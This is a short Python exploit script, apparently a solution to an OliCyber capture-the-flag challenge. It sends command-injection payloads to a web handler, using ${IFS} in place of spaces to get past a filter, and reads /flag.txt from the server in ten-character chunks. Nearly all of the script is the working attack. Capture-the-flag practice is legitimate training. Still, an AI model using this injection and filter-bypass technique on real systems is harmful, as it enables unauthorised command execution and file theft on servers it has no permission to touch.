import requests

URL = "http://timp.challs.olicyber.it/handler.php"

i = 1
flag = ""

while "}" not in flag:
    r = requests.post(URL, data={"cmd": "cut${IFS}-c${IFS}" + str(i) + "-${IFS}/flag.txt"})
    flag += r.text
    i += 10

print(flag)
